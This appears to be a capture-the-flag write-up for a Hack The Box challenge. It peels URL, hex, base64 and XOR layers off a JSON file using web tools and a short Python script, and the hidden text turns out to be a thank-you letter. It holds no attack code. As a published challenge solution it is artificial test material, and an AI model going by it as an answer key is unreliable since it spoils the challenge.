{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```
- Can use LLM to build code or a website, or just BurpDUite to decode this URL encoding to find a Hex encoded data (i did code but also selected data in BurpSuite repeater and URL decoded):
```
"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}"}
```

- This hex data can be decoded again:() I used https://cryptii.com/pipes/hex-decoder/

```
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
```
![[Pasted image 20260611100339.png]]

- We see its base64 encoded and XORd with an encyption key "HackTheBox"
- Using CyberChef I decode this bit:https://gchq.github.io/CyberChef/
![[Pasted image 20260611100807.png]]

- Exact url with full data: https://gchq.github.io/CyberChef/#input=N2IyMjY1NmU2MzcyNzk3MDc0Njk2ZjZlMjIzYTIwMjI3ODZmNzIyMjJjMjAyMjY1NmU2MzcyNzA3OTc0Njk2ZjZlNWY2YjY1NzkyMjNhMjAyMjQ4NjE2MzZiNTQ2ODY1NDI2Zjc4MjIyYzIwMjI2NTZlNjM2ZjY0Njk2ZTY3MjIzYTIwMjI2MjYxNzM2NTM2MzQyMjJjMjAyMjY0NjE3NDYxMjIzYTIwMjI0NDQxNTE0MzQ3NTg1MTY3NDI0MzQ1NDU0YzQzNDE0NTQ5NTE1MTczNTM0MzU5NzQ0MTY4NTUzOTQ0Nzc2ZjY2NGM1NTUyNzY1MzQ0Njc2NDYxNDE0MTUyNDQ2ZTUxNjM0NDU0NDE0NzQ2NDM1MTQ1NDIzMDczNjc0MjMwNTU2YTQxNTI1OTZlNDY0MTMwNDk0ZDU1Njc0NTU5Njc0OTU4NGE1MTUxNGU0ODdhNzM2NDQ2NmQ0OTQzNDU1MzUxNDU0NTQyMzgzNzQyNjc0MjY5NDI2ODVhNmY0NDY4NTk1YTY0NDE0OTRiNGU3ODMwNTc0YzUyNjg0NDQ4N2E3MzUwNDE0NDU5NDg0ODU0NzA1MDUxN2E3NzM5NDg0MTMxNjk0MjY4NTU2YzQyNDEzMDU5NGQ1NTY3NTA0YzUyNWE1OTRiNTEzODQ4NTM3YTRkNjE0MjQ0NTk0NzQ0NDQzMDQ2NDI2YjY0MzA0ODc3NDI2OTQ0NDIzMDZiNDI0MTQ1NWE0ZTUyNzc0MTU5Njg3MzUxNGM1NTQ1NDM0MzQ0Nzc0MjQxNDQ1MTRiNDY1MzMwNTA0NjMwNzMzNzQ0NmI1NTc3NDM2ODZiNzI0MzUxNmY0NjRkMzA2ODU4NTk2NzQ5NTI0YTQxMzA0YjQyNDQ3MDQ5NDY3OTYzNDM0NzU0NmY0YjQxNjc2YjM0NDQ1NTU1MzM0ODQyMzAzNjQ1NmI0YTRjNDE0MTQxNGQ0ZDU1Mzg1MjRhNjc0OTUyNDQ2YTQxNDI0Mjc5MzQ0YjU3NDMzNDQ1NDE2ODM5MzA0ODc3NmYzMzQxNzg3ODZmNDQ3Nzc3NjY2NDQxNDE0NTRlNDE3MDU5NGI2NzUxNDc0MjU4NTE1OTQzNmE0NTYzNDU1MzZmNGU0MjZiNzM2YTQxNTI0NTcxNDE0MTMwMzg1MTUxNTk0YjRlNzc0MjQ2NDk3NzQ1NjM2MTQxNTE1NjQ0Njk1OTUyNTI1MzMwNDI0ODU3Njc0ZjQyNTU3Mzc0NDI3ODQyNzM1YTU4NDk0ZjQ1Nzc3NzQ3NjQ0Mjc3NGU0YTMwMzg0ZjRjNTI0ZDYxNTM3YTU5NGU0MTY5NzM0MjQ2Njk0NTUwNDI0NTY0MzA0OTQxNTE2ODQyNDM3NzY3NDI0MzQ1NDU0YzQ1Njc0ZTQ5Nzg3ODU5NGI2NzUxNDc0MjU4NTE0YjQ1NDM3MzQ0NDQ0NzY3NTU0NTc3NTEzNjUzNDI0NTcxNDM2YzY3NzE0MjQxMzg0MzRkNTEzNTQ2NGU2NzYzNWE1MDQ1NDU0OTQyNTQ3MzY2NDM1MzYzNGM0ODc5MzE0MjQ1NDE0ZDMxNDc2Nzc3NzM0MzQ2NTI2ZjQxNjc3NzQ4NGY0MTZiNDg0YzUyMzA1YTUwNDE2NzRkNDI1ODY4NDk0MjQzNzc0YzU3NDM0MTQxNDQ1MTM4NmU1MjUxNmY3MzU0NzgzMDc3NDU1MTU5NWE1MDUxMzA0YzQ5NTE3MDU5NGI1MjRkNDc1MzdhNDk2NDQzNzk1OTRmNDY1MzMwNTA0Njc3NmYzNDUzNDI0NTc0NTQ3NzY3NzQ0NTc4NDE0NTRmNjc2YjRhNTk2NzM0NTc0YzQ1NDU1NDQ3NTQ3MzRmNDE0NDQ1NjM0NTUzNjM1MDQxNjc2NDMwNDQ3ODYzNzQ0NzQxNzc2NzU0MzA0ZDJmNGY3NzM4NDE0ZTY3NjM2NDRmNmIzMTQ0NDg0NDQ2NDk0NDUzNGQ1YTQ4NTc2NzQ4NDQ0MjY3Njc0NDUyNjM2ZTQzMzE2NzcwNDQzMDRkNGY0ZjY4MzQ0ZDRkNDE0MTU3NGE1MTUxNGU0ODMzNTE2NjQ0NTM2MzY0NDg1NzY3NDk0NDUxNTUzNzQ4Njc1MTMyNDI2ODYzNmQ1MTUyNjM0NDRhNjc0NTU0NGE3ODc4NTk0YjUxMzg0ODUzNzk2MzQ0NDQ0MzM0NDQ0MzMyNjc0MTQ1NTEzNTMwNDE0MTZmNzM0MzY4Nzg2ZDUxNTM1OTRiNGU3NzQyNDY0OTUxNjM1YTRhNDEzMDQ3NDI1NDRkNGU1MjUzNDU0MTQ2NTQ2NzRlNDI2ODM4Nzg0NDQ1NmM2OTQzNjg2YjcyNDM1NTRkNDc0ZTUxNzM0ZTRiNzc0NTY0NjE0MTQ5NGQ0MjUzNTU2NDQxNDQ0MTRiNDg0NzUyNDI0MTY3NTU3NzUzNDE0MTMwNDM2NzZmNzg1MTUyNDE0MTUwNTE1MTRhNTk2NzRkNjQ0YjUyNGQ0ZTQ0NmE0MjQ5NDQ1MzRkNjM1NzQzNzM0ZjQ0NTIzODZkNDE1MTYzMzM0Nzc4MzA3MzUxNTI2MzQ1NjQ0Mjc3NGU0YTMwMzg2MjRhNzczMDUwNDQ2YTYzNjM0NDQ0NTE0YjU3NDM0NTUwNDY3NzM0MzQ0MjQxNzc2YzQzNjg1OTcyNDI0NTRkNjY1MDQxNmI1MjU5Njc2YjRlNGM1MTMwNTE1Mzc5NDE0MTQ0NDQ0NjUwNDQ2OTQ1NDQ0NTUxNmYzNjQ4NDU1NTY4NDE0MjU1NmM0NjQxMzA0MzQ5NDI0NjRjNTM0NzU1NzM0YTMwNDU0NzQzNmE2MzQxNTI1MzRkNDI0ODQ3Njc0NTQ2NTEzNDZkNDU1NTU1NzY0MzY4NTU3MTQyNDI0NjRjNGY3NzM1NDY0ZTY3NjM2NDYxNDM2YjQzNDM0NDM4Mzg0NDUzNjM3NDQ2N2E0MjQyNDE0MTUxMzU0MjUyNDE3MzQyNjc3Nzc4NTQ1NTRkNjY1MDQxNmI0YzRiNTUzODQyNGE3ODUyNDQ0NDU0NzM2MTUyNTM0MTRiNDU1MzU5NDc1MTc3NzAzMDQ3NDE1MTc3NDczMTY3NmU0MjMwNGQ2NjUwNDE0NTU3NTk2NzU5NTc0Yjc4NGQ0NzQ0N2EzMDRiNDM1MzY0NTA0NTY5NjM1NTQ1NTE1NTc4NDU1NTc0Njk0ZTY4NjMzOTQ1MzA0ZDQ5NGY3NzU5NTI0ZDQxNTk2MTUwNTI1NTRiNDI0NDZmNjI1MjUzNmY0ZjQ0NjkzMTQyNDU0MTRkMzE0NzQxNDE2ZDU0Nzc3NzY3NDI0NTRkNjQ0ZDUyNmY2MzU5Njc2YjVhNGI2ODRkNGI0MzQ4NTE0ODQxMzI0OTQxNDQ1NDcwNDI0NTc3NjMzMTQ4NDE0ZDc0NDg1MjU2NmY0MTQxMzA1MDY0NDE0NTRjNGQ1MjM4NTI0ZjY3NTE0ODUzNzk0NTYyNTI1NDU5NDE1NzQzNzM0ZjQ0NTIzODM5NDI2ODQxNmE0MTc4NTE3ODUxNTE2ZjQ2NGY2NzYzNTQ0OTc4NzM2NDYxNDE0MTRlNDQzMzUxNGU0NTc5MzA0NDQ0NjkzMTUwNTE3YTc3Nzg1MzQxNTE3NzQzNmM2NzY4NDQ0MTM0NGY0ZjY4NzM0MTRjNjg1YTU5NGY0MjRkNGQ0ODZhNDI0OTQzNjk1MjUwNDQ3OTQxNDE0NjMwNzM2YTQ0NTU1NTcxNDQ2NzM0NzQ1MTUxNDk0OTRlNzc2MzQ5NGQ2NzRkNTI0Zjc3NmI0NzQ0MzM1MTYzNDM2OTU1NGI0NDQzNDE0NTQ1NTU2NDMwNDM1MTczNmQ1NDc3Mzg3NDUxNTE1OTRiNGQ3NzMwNTg0YzY4NWE1OTRiNTEzODU4NDE2YTYzNDI0NjUzNGQ2MjQ4NTc2NzU2NDM3NzM1MzA0Mzc3NmYzMzQxNTE3NzZiNDI0MjQxNTk2NDQxNTU0ZDRjNjc2ZjRjNTA0MTM0NGU0NDY5NjQ0OTQ4NDM2MzYyNTc0NDc3NGY1MTc3NjczNzQyNTE0MjczNWE1ODQ5NDE0MjQyNDU0ZjYzNzg3NDQ2NGU2NzQyNTk1MDQxNmI0NzUzN2E2ZjRlNDg1NDVhNTA0Nzc5NDE0MTQ1NzgzODc4NDc2YjZjNjk0NzQyNDE3NDQ1Nzc1YTRjNDk3NzMxNDY0ZTUxNTk1NTRhNDU0NTQxNDI0NDZmNjM0NDQzNzc2MTQ4NTc2NzU2NDQ0NTczNmI0ODUyNTk3MTU0Nzc3NzY3NDI0NTRkNGE0Zjc4MzA0YzRhNjczNDRiNDk1MTUxNTE1MzdhNzM0ZjUyNTM0NTU3NDc2OTMwNTQ0NTQxMzQzMzQ4NTI2MzcyNDc3NzQ2NmI1MTUxNmY0NjRhNzg2NzRkNGQ0MTcwNTk1MDQxNmI0NzUzN2E2ZjRlNDg1NDVhNTA0ODc5MzA1MDQyNjg2YjMxNDg0MTc3NzQ0MTU2Njc2ZTQyMzA0ZDRmNDk0MTQxNGQ0OTUxMzQ1NTYxNDE2YjQzNDM0NDM4NGU0NjdhNDY0NDU3NDM2YjUwNDIzMDczMzM0NzY3NDE2YTQ3NzgzMTZmNDE0NTRkNjM0Zjc4NmY0YTRhNmIzODUwNDk0MTUxNTI0NDZlNTE0NDQzNzkzMDU5NDY0MzMwNDY0MjQxMzUzMDQxNTI1YTY5NDQ2ODczNzI0MjQyNDE1OTUwNTE2ZjRhNGEzMDM4NGQ0YTMwNDU0MzQyN2E2ODQ3NjIzMDY3MzQ0NTU0Nzc0YTUxNzczODc4NDQ1MjU1NmU0ODQxNzg2ZjQyNjg0NTRiNDk0MTQ1NTI0ZTc3NzM2NDVhNDc3NDcwNTA3YTc3NGU1MjUxNmY0ZjQ3Nzk0ZDMxNDM3NzM0NTc0Mjc4MzE2OTRmNzgzMDcwNDQ0MTNkM2QyMjdk&ieol=CRLF&oeol=CRLF

```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```

- Alternatively can do the whole thing together with this code:
```
cat decode.py

---OUTPUT---
import json
import urllib.parse
import base64

# Load file
with open("thank_you.json", "r") as f:
    raw = f.read()

# STEP 1: outer JSON
outer = json.loads(raw)

# STEP 2: URL decode
decoded_url = urllib.parse.unquote(outer["data"])

# STEP 3: parse hex-layer JSON string
hex_layer = json.loads(decoded_url)

# STEP 4: hex decode → inner JSON
inner = json.loads(bytes.fromhex(hex_layer["data"]).decode())

# STEP 5: base64 decode
cipher = base64.b64decode(inner["data"])

# STEP 6: XOR key (NOTE TYPO: encrpytion_key)
key = inner["encrpytion_key"].encode()

# STEP 7: decrypt
plain = bytes([b ^ key[i % len(key)] for i, b in enumerate(cipher)])

print(plain.decode(errors="ignore"))
```

- i run it to get the decoded text:
```
python3 decode.py 

---OUTPUT---
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team

```